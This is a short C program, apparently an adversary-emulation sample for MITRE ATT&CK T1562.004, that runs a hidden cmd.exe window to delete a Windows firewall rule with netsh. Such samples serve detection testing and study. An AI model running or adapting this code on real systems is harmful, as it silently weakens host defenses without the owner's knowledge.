// Link      = https://attack.mitre.org/techniques/T1562/004/
// Technique = Impair Defenses: Disable or Modify System Firewall
// ID        = T1562.004
// Tactics   = Defense Evasion

#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("netsh advfirewall firewall delete rule name=\"My Rule\"");
    return 0;
}